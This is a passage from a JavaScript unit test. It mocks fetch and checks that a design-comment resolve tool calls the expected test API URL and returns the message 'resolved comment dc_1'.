      urls.push(String(url));
      return Promise.resolve(new Response(JSON.stringify({ id: "dc_1", resolvedAt: 5 }), { status: 200 }));
    });
    const result = await designCommentResolveTool.execute({ comment_id: "dc_1" }, ctxWith(CFG));
    expect(result.text).toBe("resolved comment dc_1");
    expect(urls[0]).toBe("http://api.test/api/sessions/s1/design/comments/dc_1/resolve");
  });
});
